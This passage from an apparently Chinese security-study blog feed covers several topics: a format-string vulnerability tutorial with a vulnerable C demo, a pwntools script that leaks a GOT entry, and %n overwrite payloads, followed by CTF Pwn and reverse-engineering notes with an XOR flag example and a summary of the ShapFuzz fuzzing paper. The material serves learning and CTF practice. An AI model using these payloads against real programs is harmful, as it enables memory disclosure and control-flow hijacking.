class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">int</span> a = <span class="hljs-number">1</span>, b = <span class="hljs-number">0x22222222</span>, c = <span class="hljs-number">-1</span>;<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x.%08x.%08x.%s\n&quot;</span>, a, b, c, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>简单编译一下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -m32 -fno-stack-protector -no-pie -o leakmemroy leakmemory.c</span><br></code></pre></td></tr></table></figure><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905170410147.png" class="" title="image-20240905170410147"><p>可以看出，编译器给了警告信息，说程序中没有给出格式化字符串的参数。接下来看一下如何获取对应的栈内存。根据C语言的调用规则，格式化字符串函数会根据格式化字符串直接使用栈上自顶向上的变量作为其参数（64位会根据其传参的规则进行获取）。这里主要介绍32位。</p><p><strong>获取栈变量数值</strong></p><p>首先，可以利用格式化字符串来获取栈上变量的数值。运行结果如下：</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905181033717.png" class="" title="image-20240905181033717"><p>可以看到，确实得到了一些内容。为了更加细致的观察，利用GDB调试一下，验证猜想。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905180755822.png" class="" title="image-20240905180755822"><p>启动程序后，断点下在printf函数处</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905180851048.png" class="" title="image-20240905180851048"><p>输入<code>%08x.%08x.%08x</code></p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905181606245.png" class="" title="image-20240905181606245"><p>停在了第一次调用printf函数的位置。此时进入了printf函数中，栈中的第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。继续运行程序</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905182041024.png" class="" title="image-20240905182041024"><p>程序的确输出了每一个变量对应的数值，并且断在了下一个printf处</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905182237830.png" class="" title="image-20240905182237830"><p>此时，由于格式化字符串为%x%x%x,所以，程序会将栈上的<code>0xffffd070</code>及其之后的数值分别以第一，第二，第三个参数按照int类型进行解析，分别输出。继续运行，查看结果。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905183316461.png" class="" title="image-20240905183316461"><p>确实会将栈顶的内存数据以预定的形式输出出来。</p><p>但是需要注意的是，并不是每次得到的结果都一样，因为栈上的数据会应为每次分配的内存页不同而有所不同，这是因为栈不是对内存页做初始化的。</p><p>**根据上面的方法，可以依次获得栈中的每个参数，有没有办法直接获取栈中被视为第n+1个参数的值呢？**方法如下：</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-built_in">%n</span><span class="hljs-built_in">$x</span><br></code></pre></td></tr></table></figure><p>利用如下字符串，可以获取到对应的第n+1个参数的数值。为什么是第n+1个参数？因为格式化参数里面的n指的是该格式化字符串对应的第n个输出参数，那相对于输出函数来说，就是第n+1个参数。</p><p>再次以gdb调试一下。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905184015890.png" class="" title="image-20240905184015890"><p>输入换成<code>%3$x</code></p><p><strong><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905184142961.png" class="" title="image-20240905184142961"></strong></p><p>可以看到，获得了printf的第四个参数所对应的值.</p><p><strong>获取栈变量对应字符串</strong></p><p>此外，我们还可以获得栈变量对应的字符串，需要用到%s</p><blockquote><p>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</p><p>利用%s来获取变量所对应地址的内容，只不过有零截断</p><p>利用<code>%order$x</code>来获取指定第order+1参数的值，利用<code>%order$s</code>来获取指定第order+1参数的对应地址的内容。</p></blockquote><h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>可以看出，上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，都没能完全控制所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，可能想要泄露某一个libc函数的got表内容，从而得到其地址，进而获取libc版本以及其他函数的地址，这时候，能够完全控制泄露某个地址的内存就显得很重要了。</p><p>一般来说，在格式化字符串漏洞中，所读取的格式化字符串都是在栈上的（因为是某个函数的局部变量，本例中s是main函数的局部变量）。那么也就是说，在调用输出函数的时候，其实，第一个参数的值其实就是该格式化字符串的地址。</p><p>在先前的实验中，栈上的第二个变量就是格式化字符串的地址，同时该地址存储的也是”%s”格式化字符串内容。</p><p>由于可以控制该格式化字符串，如果知道该格式化字符串在输出函数调用时时第几个参数，那么就可以通过如下方式来获取某个指定地址addr的内容。</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos">addr<span class="hljs-built_in">%k</span><span class="hljs-built_in">$s</span><br></code></pre></td></tr></table></figure><blockquote><p>在这里，如果格式化字符串在栈上，那么就一定确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址8字节或者16字节。</p></blockquote><p>下面就是如何确定该格式化字符串为第几个参数的问题了，可以通过如下方式确定</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-attr">[tag]</span>%<span class="hljs-selector-tag">p</span>%<span class="hljs-selector-tag">p</span>%<span class="hljs-selector-tag">p</span>%<span class="hljs-selector-tag">p</span>...<br></code></pre></td></tr></table></figure><p>一般来说，重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与前面的tag重复了，那么就有很大把握说明该地址就是格式化字符串的地址，之所以说很大把我，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，可以更换其他字符进行尝试，进行再次确认。这里利用字符’A’作为tag，程序依然是先前的示例程序。</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905192046910.png" class="" title="image-20240905192046910"><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905192400233.png" class="" title="image-20240905192400233"><p>由41414141处所在的位置可以看出格式化字符串的起始地址正好是输出函数的第5个参数，那么它是格式化字符串的第4个参数。可以测试一下</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905192511692.png" class="" title="image-20240905192511692"><p>程序崩溃了，因为试图将该格式化字符串所对应的值作为地址进行解析(这是%s的作用)，但是显然该值无法作为一个合法的地址被解析，所以崩溃了。</p><p>这是因为变量值不能够该程序访问，所以程序自然崩溃。如果设置一个可访问的地址呢？比如果scanf@got，结果会怎么样呢？应该自然是输出scanf对应的地址。</p><p>首先，获取scanf@got的地址，如下</p><img src="/2024/08/15/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8-%E5%9F%BA%E7%A1%80/image-20240905192920308.png" class="" title="image-20240905192920308"><p>利用pwntools构造payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>sh = process(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>leakmemory = ELF(<span class="hljs-string">&#x27;./leakmemory&#x27;</span>)<br>__isoc99_scanf_got = leakmemory.got[<span class="hljs-string">&#x27;__isoc99_scanf@GLIBC_2.7&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(__isoc99_scanf_got))<br>payload = p32(__isoc99_scanf_got) + <span class="hljs-string">&#x27;%4$s&#x27;</span><br><span class="hljs-built_in">print</span>(payload)<br>gdb.attach(sh)<br>sh.sendline(payload)<br>sh.recvuntil(<span class="hljs-string">&#x27;%4$s\n&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u32(sh.recv()[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>])))<br>sh.interactive()<br></code></pre></td></tr></table></figure><p>使用该payload确实获得的scanf的地址。发送的payload为<code>0x804c014%4$s</code>，格式化字符串在输出函数调用时是第5个参数，因此将这个参数换成<code>%4$s</code>，前面加地址就能获取指定地址的内容。</p><blockquote><p>加上指定地址，需要使用pwn脚本，因为输入的地址不会被解析成地址，而是字符串。pwn脚本会将其以字节串的形式传输，那么程序会将地址保存在栈中。</p></blockquote><h4 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h4><p>上面已经展示了如何利用格式化字符串来泄露内存以及任意地址内存，那么有没有可能修改栈上变量的值呢，甚至修改任意地址变量的内存？这是可行的，只要变量对应的地址可写，就可以利用格式化字符串来修改其对应的数值。这里可以想一下格式化字符串中的类型</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">n</span></span>, 不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量<br></code></pre></td></tr></table></figure><p>通过这个类型参数，再加上一些小技巧，可以达成目的。这里仍然分为两部分，一部分为覆盖栈上的变量，第二部分为覆盖指定地址的变量。</p><p>这里给出如下程序来介绍</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* example/overflow/overflow.c */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> a = <span class="hljs-number">123</span>, b = <span class="hljs-number">456</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> c = <span class="hljs-number">789</span>;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">100</span>];<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p\n&quot;</span>, &amp;c);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, s);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-keyword">if</span> (c == <span class="hljs-number">16</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified c.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (a == <span class="hljs-number">2</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified a for a small number.&quot;</span>);<br>  &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (b == <span class="hljs-number">0x12345678</span>) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;modified b for a big number!&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>无论覆盖哪个地址的变量，基本上都是构造类似如下的payload</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">...[overwrite addr]....%[overwrite <span class="hljs-built_in">offset</span>]$<span class="hljs-built_in">n</span><br></code></pre></td></tr></table></figure><p>其中…表示我们填充的内容，overwrite addr表示我们所要覆盖的地址，overwrite offset地址表示所要覆盖的地址存储的位置为输出函数的格式化字符串的第几个参数。所以一般来说，也是如下步骤</p><ol><li>确定覆盖地址</li><li>确定相对偏移</li><li>进行覆盖</li></ol><h5 id="覆盖栈内存"><a href="#覆盖栈内存" class="headerlink" title="覆盖栈内存"></a>覆盖栈内存</h5><p><strong>确定覆盖地址</strong></p><p>首先，自然是想办法知道栈变量c的地址。由于目前几乎上所有的程序都开启了ASLR保护，所以栈的地址一直在变，所以我们这里故意输出c变量的地址。</p><p><strong>确定相对偏移</strong></p><p>其次，我们来确定一下存储格式化字符串的地址是printf将要输出的第几个参数。这里通过之前的泄露栈变量数值的方法来进行操作。通过调试</p><h2 id="CTF权威指南-Pwn"><a href="#CTF权威指南-Pwn" class="headerlink" title="CTF权威指南-Pwn"></a>CTF权威指南-Pwn</h2><h3 id="从源代码到可执行文件"><a href="#从源代码到可执行文件" class="headerlink" title="从源代码到可执行文件"></a>从源代码到可执行文件</h3><h4 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h4><p>编译器的作用是读入以某种语言编写的程序，输出等价的用另一种语言编写的程序。编译器的结构可分为前端和后端两部分。<strong>前端是机器无关的，其功能是把源程序分解成组成要素和相应的语法结构，通过这个结构创建源程序的中间表示，同时收集和源程序相关的信息，存放到符号表中；后端则是机器相关的，其功能是根据中间表示和符号表信息构造目标程序。</strong></p><p>编译过程可大致分5个步骤。</p><ul><li><p>词法分析(Lexical analysis)：读入源程序的字符流，输出为有意义的词素(Lexeme)；</p></li><li><p>语法分析(Syntax analysis)：根据各个词法单元的第一个分量来创建树型的中间表示形式，通常是语法树；</p></li><li><p>语义分析(Semantic analysis)：使用语法树和符号表中的信息，检测源程序是否满足语言定义的语义约束，同时收集类型信息，用于代码生成、类型检查和类型转换。</p></li><li><p>中间代码生成和优化：根据语义分析输出，生成类机器语言的中间表示，如三地址码。然后对生成的中间代码进行分析和优化；</p></li></ul><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p><strong>怎么快速入门逆向工程</strong></p><p>​逆向工程是从比较底层的观点对程序运行过程进行分析的过程，我们平时遇到的C语言、Python、Java都是高级语言，它们可以被编译&#x2F;解释为CPU能”看懂“的二进制汇编代码(低级语言)，从而CPU可以直接执行它们，并修改CPU内部的一些变量或者是内存中的一些值，使得程序进行正常的逻辑，从而正常和用户进行交互。而我们要做的就是从这些二进制汇编中，恢复原来的加密算法或者分析程序逻辑。</p><p><strong>CTF比赛中的逆向题是什么</strong></p><p>CTF比赛中一般会给你一个可执行文件或其他文件，可能是C&#x2F;C++写的，可能是Python写的，Java写的，C#写的….不管出什么，都得硬着头皮看下去，不懂的东西直接查，以一个简单例子介绍逆向题。</p><p>一般CTF，主办方会给一个输入东西的程序，输入东西后，程序会进行一系列加密或者取数据摘要，然后把面目全非的结果和一个常量（正确的flag进行加密或者取数据摘要后的结果）进行比较，如果两个值一样，则拿到 正确的flag，否则就是flag错误。</p><p>对于简单题，喜欢使用strcmp(input_flag, “real_flag”)；这样的C语言函数进行字符串比较，注意这里并没有进行加密，所以非常简单，只要在IDA中看到了这样的代码就可以很容易察觉它进行了比较，就可以获取flag。进阶一点的题，会使用位运算中的异或(xor)！</p><p>例题：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> input[] = <span class="hljs-string">&quot;moectf&#123;?????????????????????????????????&#125;&quot;</span>; <span class="hljs-comment">// 这是假的flag</span><br><span class="hljs-type">char</span> password_enc[] = &#123; <br><span class="hljs-number">123</span>, <span class="hljs-number">121</span>, <span class="hljs-number">115</span>, <span class="hljs-number">117</span>, <span class="hljs-number">98</span>, <span class="hljs-number">112</span>, <span class="hljs-number">109</span>, <span class="hljs-number">100</span>, <span class="hljs-number">37</span>, <span class="hljs-number">96</span>, <span class="hljs-number">37</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">37</span>, <span class="hljs-number">73</span>, <span class="hljs-number">39</span>,<br><span class="hljs-number">101</span>, <span class="hljs-number">73</span>, <span class="hljs-number">119</span>, <span class="hljs-number">73</span>, <span class="hljs-number">122</span>, <span class="hljs-number">121</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">73</span>, <span class="hljs-number">122</span>, <span class="hljs-number">121</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">73</span>, <span class="hljs-number">97</span>, <span class="hljs-number">119</span>, <br><span class="hljs-number">111</span>, <span class="hljs-number">73</span>, <span class="hljs-number">98</span>, <span class="hljs-number">121</span>, <span class="hljs-number">73</span>, <span class="hljs-number">115</span>, <span class="hljs-number">110</span>, <span class="hljs-number">102</span>, <span class="hljs-number">122</span>, <span class="hljs-number">121</span>, <span class="hljs-number">100</span>, <span class="hljs-number">115</span>, <span class="hljs-number">107</span>, <span class="hljs-number">22</span> &#125;;<br><span class="hljs-comment">// password_enc的每一位和22进行异或, 就能得到真实的密码</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">46</span>; i++) &#123; <span class="hljs-comment">// 46是 input的长度，也是flag的长度！</span><br><span class="hljs-keyword">if</span> ((input[i] ^ <span class="hljs-number">22</span>) != password_enc[i]) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Password is wrong!\n&quot;</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br>&#125;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Password is right!\n&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于异或运算的性质，<code>a^b=c</code>的时候，<code>c^b=a</code>,是一个<strong>可逆操作</strong>，加密的时候可以异或22，解密的时候也是异或22，这是一个最基础的”对称加密算法“，因为加解密的”密钥“都是22。做题时需要分析如下情况：</p><ol><li>加密是如何实现的，是否可以把加密算法搬到自己的代码上正确运行？</li><li>加密是否对称？加密的密钥和解密的密钥是否一样？</li><li>如何逆向进行加密算法，或者对ASCII码进行爆破（如果一个字节变换不会引起其他很多字节的变换，这种情况下暴力往往是非常块的）。</li></ol><p>显然，上述对称加密算法，直接将password_enc与22按位异或即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">char</span> input[] = <span class="hljs-string">&quot;moectf&#123;?????????????????????????????????&#125;&quot;</span>; <span class="hljs-comment">// 这是假的flag</span><br><span class="hljs-type">char</span> password_enc[] = &#123; <br><span class="hljs-number">123</span>, <span class="hljs-number">121</span>, <span class="hljs-number">115</span>, <span class="hljs-number">117</span>, <span class="hljs-number">98</span>, <span class="hljs-number">112</span>, <span class="hljs-number">109</span>, <span class="hljs-number">100</span>, <span class="hljs-number">37</span>, <span class="hljs-number">96</span>, <span class="hljs-number">37</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">37</span>, <span class="hljs-number">73</span>, <span class="hljs-number">39</span>,<br><span class="hljs-number">101</span>, <span class="hljs-number">73</span>, <span class="hljs-number">119</span>, <span class="hljs-number">73</span>, <span class="hljs-number">122</span>, <span class="hljs-number">121</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">73</span>, <span class="hljs-number">122</span>, <span class="hljs-number">121</span>, <span class="hljs-number">120</span>, <span class="hljs-number">113</span>, <span class="hljs-number">73</span>, <span class="hljs-number">97</span>, <span class="hljs-number">119</span>, <br><span class="hljs-number">111</span>, <span class="hljs-number">73</span>, <span class="hljs-number">98</span>, <span class="hljs-number">121</span>, <span class="hljs-number">73</span>, <span class="hljs-number">115</span>, <span class="hljs-number">110</span>, <span class="hljs-number">102</span>, <span class="hljs-number">122</span>, <span class="hljs-number">121</span>, <span class="hljs-number">100</span>, <span class="hljs-number">115</span>, <span class="hljs-number">107</span>, <span class="hljs-number">22</span> &#125;;<br><span class="hljs-comment">// password_enc的每一位和22进行异或, 就能得到真实的密码</span><br><span class="hljs-type">char</span> password[<span class="hljs-number">47</span>];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">46</span>; i++) &#123; <span class="hljs-comment">// 46是 input的长度，也是flag的长度！</span><br>    password[i] = password_enc[i] ^ <span class="hljs-number">22</span>;<br>&#125;<br>password[<span class="hljs-number">46</span>] = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, password);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ShapFuzz：论文阅读</title>
    <link href="/2024/08/07/ShapFuzz%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <url>/2024/08/07/ShapFuzz%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="SHAPFUZZ-Efficient-Fuzzing-via-Shapley-Guided-Byte-Selection"><a href="#SHAPFUZZ-Efficient-Fuzzing-via-Shapley-Guided-Byte-Selection" class="headerlink" title="SHAPFUZZ: Efficient Fuzzing via Shapley-Guided Byte Selection"></a>SHAPFUZZ: Efficient Fuzzing via Shapley-Guided Byte Selection</h1><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>​基于变异的模糊测试是一种流行且有效的技术，用于发现程序中的漏洞和未覆盖代码。然而，只有少数研究关注<strong>量化输入字节的重要性</strong>。每个输入字节的重要性由其在发现新代码中的贡献程度决定。以前的工作往往集中于获取输入字节与路径约束之间的关系，而忽略了并非所有与约束相关的字节都能发现新代码的事实。在本文中，作者进行Shapley分析来理解字节位置对模糊测试性能的影响，发现某些字节位置比其他字节位置贡献更大，并且这种特性通常在不同的种子之间保持一致。基于此观察结果，我们提出了一种新颖的解决方案，成为SHAPFUZZ，以指导模糊测试过程中的字节选择变异。具体而言SHAPFUZZ在模糊测试期间每次测试输入时，以低开销更新字节的Shapley值（重要性）。它利用上下文多臂老虎机（CMAB）算法在变异高Shapley值字节和和低频选择字节之间进行权衡。作者基于AFL ++实现该解决方案的原型，即SHAPFUZZ，并针对包括五个字节调度Fuzzer和五个常用的Fuzzer在内的十个最先进的模糊器对其进行评估。与字节调度模糊器相比，SHAPFUZZ发现了更多边。它还在三组不同的初始种子集上暴露了比最佳基线更多的漏洞。SHAPFUZZ比最佳常用的模糊器多暴露20个漏洞，并且在MAGMA上比基线多发现6个CVE。此外，SHAPFUZZ在6个广泛使用的程序的最新版本上发现了11个新漏洞，其中3个漏洞已得到供应商的确认。</p><h3 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h3><p>基于变异的模糊测试，核心是：**变异哪些字节？**这些字节该用什么值？</p><blockquote><p>作者将Shapley值法应用于模糊测试的havoc变异阶段，指导应当变异哪些字节组合。</p></blockquote><p>在确定变异字节的方向中，先前已有的研究：</p><ul><li><code>TaintScope</code>&#x2F;<code>Dowser</code>&#x2F;<code>Angora</code>依赖于额外的分析(污点分析)来识别与路径约束相关的字节</li><li><code>GREYONE</code>&#x2F;<code>REDQUEEN</code>&#x2F;<code>ProFuzzer</code>&#x2F;<code>PATA</code>间接推断字节和约束之间的依赖关系</li><li><code>NEUZZ</code>&#x2F;<code>MTFuzz</code>&#x2F;<code>EMS</code>从历史数据中提取信息来找到变异的位置</li></ul><p><strong>现有研究不足之处</strong></p><ul><li>前文所提及的解决方案中<strong>平等地对待所有与约束相关的字节</strong>，在无法发现新代码的字节上浪费时间和能量。</li><li>现有的解决方案所需的额外分析阶段通常由于其逐字节调查而<strong>非常耗时，代价较高</strong>。</li><li>对于基于<strong>深度学习</strong>的Fuzzer，这个额外的分析阶段甚至可能导致模糊测试过程失败，因为构建模型时，<strong>输入尺寸过大</strong>会导致内存不足。</li></ul><p><strong>解决方案</strong></p><p>​作者的关键思路是<strong>量化与约束相关字节的重要性</strong>，而不需要额外的分析阶段。新区域的发现是由于某些字节的合作，准确来说是它们协作变异的结果。作者从合作博弈论的角度出发，将模糊测试的字节调度部分视为Shapley Analysis的“过程”。</p><blockquote><p>过程：作者在Fuzzing中应用Shapley分析，通过计算字节组合中每个字节的边际贡献</p></blockquote><p>​Shapley Analysis被广泛用于量化每个参与者对结果的贡献。通过量化输入字节的重要性，可以找到更有可能发现新代码的字节，并在这些字节上进行更多的变异尝试。Shapley Analysis可以集成到变异过程中，因此不需要额外的分析阶段来获得字节的重要性。</p><p><strong>Shapley Analysis</strong></p><p>​在合作博弈论中，玩家联盟共同参与游戏并获得收益。关键问题是每个玩家对联盟的贡献程度。为了解决这个问题，人们提出了许多方法。其中最著名的解决方案是Shapley值，这是一种在合作博弈中分配收益的方法。具体来说，Shapley值是每个玩家对所有可能的玩家联盟的边际贡献的加权平均值。此外，Shapley值已应用于许多领域，例如量化深度学习模型中特征的重要性。简单来说，就是一个由玩家组成的联盟参加一场游戏获得收益，那么如何分配收益才是公平的？Shapley值用来解决这个公平分配问题。</p><p>​本文的核心在于Shapley值法的应用。重要的就是计算每个玩家的边际贡献。如图，举例说明：</p><img src="/2024/08/07/ShapFuzz%EF%BC%9A%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/image-20240918150542017.png" class="" title="image-20240918150542017"><p>​现在假设Tom每小时能挣10美元，Mike每小时能挣20美元，他们一起作为一个联盟每小时能挣40美元。那么现在便有个问题，该如何分配这40美元？平均分配显然对Mike来说不公平。通过Shapley值法，先计算各自的边际贡献。A的边际贡献即是A给联盟其他人带来的价值。那么对Tom来说，Mike的边际贡献就是40-10&#x3D;30。对Mike来说，Tom的边际贡献就是40-20&#x3D;20。根据Shapley值法，Tom应该获得的收益为(10+20)&#x2F;2 &#x3D; 15$，Mike应该获得的收益为(20+30)&#x2F;2&#x3D;25$。</p><p>​在模糊测试中的变异阶段，fuzzer会将选择好的种子进行变异，fuzzer的变异算子会改变某个随机字节或比特位的值（例如，位翻转，字节算术加减随机数等）。变异代价相对执行而言小很多，因此通常对一个种子变异多次，这会形成该次变异的字节组合。具体而言，作者将一次变异中值发生改变的字节作为一个字节组合。<strong>将每个字节组合作为一个联盟，每个字节作为一个玩家，发现新区域（新边）的数量作为收益R，来计算每个字节的临时Shapley值以指导下一次变异该选择哪些字节进行变异。</strong></p><h3 id="Motivation"><a href="#Motivation" class="headerlink" 